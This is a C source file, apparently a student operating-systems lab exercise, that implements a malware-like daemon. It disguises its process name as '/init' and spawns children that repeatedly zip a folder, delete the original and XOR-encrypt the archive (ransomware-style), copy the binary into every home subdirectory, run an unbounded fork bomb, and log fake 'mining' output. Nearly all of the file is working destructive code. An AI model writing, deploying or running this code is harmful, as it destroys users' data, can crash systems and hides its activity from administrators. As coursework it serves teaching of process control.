#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <time.h>
#include <limits.h>
#include <syslog.h>
#include <sys/wait.h> 

#define PATH_MAX 4096
extern char **environ;

void initialize_daemon() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (setsid() < 0) exit(EXIT_FAILURE);
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);

    umask(0);
    if (chdir("/") != 0) exit(EXIT_FAILURE);

    for (int fd = 0; fd < sysconf(_SC_OPEN_MAX); fd++) {
        close(fd);
    }
}

void disguise_process(int argc, char **argv) {
    environ = NULL;
    prctl(PR_SET_NAME, "/init", 0, 0, 0);
    if (argc > 0 && argv[0]) {
        memset(argv[0], 0, strlen(argv[0])); 
        snprintf(argv[0], 64, "/init    "); 
    }
}

void xorfile(const char *filename, unsigned int key) {
    FILE *in = fopen(filename, "rb");
    if (!in) return;

    char tmpfile[PATH_MAX];
    snprintf(tmpfile, sizeof(tmpfile), "%s.tmp", filename);
    FILE *out = fopen(tmpfile, "wb");
    if (!out) {
        fclose(in);
        return;
    }

    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch ^ key, out);
    }

    fclose(in);
    fclose(out);

    remove(filename);
    rename(tmpfile, filename);
}

void encrypt_file(const char *folder_path, unsigned int key) {
    char zipfile[PATH_MAX];
    snprintf(zipfile, sizeof(zipfile), "%s.zip", folder_path);

    pid_t zip_pid = fork();
    if (zip_pid == 0) {
        execlp("zip", "zip", "-r", "-q", zipfile, folder_path, (char *)NULL);
        exit(EXIT_FAILURE);
    } else if (zip_pid > 0) {
        int status;
        waitpid(zip_pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            pid_t rm_pid = fork();
            if (rm_pid == 0) {
                execlp("rm", "rm", "-rf", folder_path, (char *)NULL);
                exit(EXIT_FAILURE);
            } else if (rm_pid > 0) {
                waitpid(rm_pid, &status, 0);
                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                    xorfile(zipfile, key);
                }
            }
        }
    }
}

void replicate_self_to_home(const char *home_dir) {
    DIR *dir = opendir(home_dir);
    if (!dir) return;

    struct dirent *entry;
    char current_path[PATH_MAX];
    char self_path[PATH_MAX];

    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) {
        closedir(dir);
        return;
    }
    self_path[len] = '\0';
    const char *filename = strrchr(self_path, '/');
    filename = filename ? filename + 1 : self_path;

    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;

        snprintf(current_path, sizeof(current_path), "%s/%s", home_dir, entry->d_name);
        struct stat st;
        if (stat(current_path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            char destination[PATH_MAX];
            snprintf(destination, sizeof(destination), "%s/%s", current_path, filename);
            FILE *src = fopen(self_path, "rb");
            FILE *dest = fopen(destination, "wb");
            if (!src || !dest) {
                if (src) fclose(src);
                if (dest) fclose(dest);
                continue;
            }
            char buffer[4096];
            size_t bytes;
            while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                fwrite(buffer, 1, bytes, dest);
            }
            fclose(src);
            fclose(dest);
        }
    }

    closedir(dir);
}
void child_wannacryptor(const char *target_path, unsigned int key, int argc, char **argv) {
    pid_t child = fork();
    if (child == 0) {
        prctl(PR_SET_NAME, "wannacryptor", 0, 0, 0);
        if (argc > 0) {
            memset(argv[0], 0, 64);
            strncpy(argv[0], "wannacryptor", 64);
        }
        while (1) {
            encrypt_file(target_path, key);
            sleep(30);
        }
    }
}

void child_trojan_wrm(int argc, char **argv) {
    pid_t child = fork();
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);
        if (argc > 0) {
            memset(argv[0], 0, 64);
            strncpy(argv[0], "trojan.wrm", 64);
        }

        const char *home_dir = getenv("HOME");
        if (!home_dir) exit(EXIT_FAILURE);

        while (1) {
            replicate_self_to_home(home_dir);
            sleep(30);
        }
    }
}

void rodok_fork_bomb() {
    while (1) {
        if (fork() == 0) {
            rodok_fork_bomb();
        }
    }
}

void child_rodok(int argc, char **argv) {
    pid_t rodok = fork();
    if (rodok == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
        if (argc > 0) {
            memset(argv[0], 0, 64);
            strncpy(argv[0], "rodok.exe", 64);
        }
        rodok_fork_bomb();
    }
}

void mine_hash(int id) {
    prctl(PR_SET_PDEATHSIG, SIGTERM);
    char hash[65];
    srand(time(NULL) ^ id);
    while (1) {
        for (int i = 0; i < 64; i++) {
            hash[i] = "0123456789abcdef"[rand() % 16];
        }
        hash[64] = '\0';

        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char log_entry[128];
        snprintf(log_entry, sizeof(log_entry),
            "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
            t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
            t->tm_hour, t->tm_min, t->tm_sec, id, hash);

        FILE *log = fopen("/tmp/.miner.log", "a");
        if (log) {
            fputs(log_entry, log);
            fclose(log);
        }

        sleep((rand() % 28) + 3);
    }
}

void start_mining(int max_miners) {
    for (int i = 0; i < max_miners; i++) {
        if (fork() == 0) {
            mine_hash(i);
            exit(EXIT_SUCCESS);
        }
    }
}


int main(int argc, char *argv[]) {
    initialize_daemon();
    disguise_process(argc, argv);

    child_wannacryptor("/home/Downloads/Praktikum-2-Sisop/soal_3/data", (unsigned int)time(NULL), argc, argv);
    child_trojan_wrm(argc, argv);
    child_rodok(argc, argv);

    if (fork() == 0) {
        while (1) {
            replicate_self_to_home("/home/target");
            sleep(30);
        }
    }

    if (fork() == 0) {
        int max_miners = 3;
        if (max_miners < 3) max_miners = 3;
        start_mining(max_miners);
        while (1) sleep(60);
    }

    while (1) sleep(60);
    return 0;
}
